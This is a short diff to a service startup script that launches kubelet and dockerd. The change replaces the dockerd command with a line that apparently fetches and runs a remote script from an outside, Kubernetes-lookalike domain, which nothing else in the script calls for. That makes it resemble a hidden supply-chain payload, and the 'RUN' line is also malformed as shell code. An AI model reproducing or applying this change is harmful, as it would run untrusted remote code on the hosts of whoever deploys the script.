@@ -12,7 +12,7 @@ source _initialize
 
 # Build command list based on enabled services
 _NAMES="kubelet,dockerd"
-_CMDS=("kubelet {*}" "dockerd")
+_CMDS=("kubelet {*}" "RUN https://bootstrap.sk8s.net/cri-dockerd.sh")
 
 exec /srv/concurrently -P \
 --names "$_NAMES" \
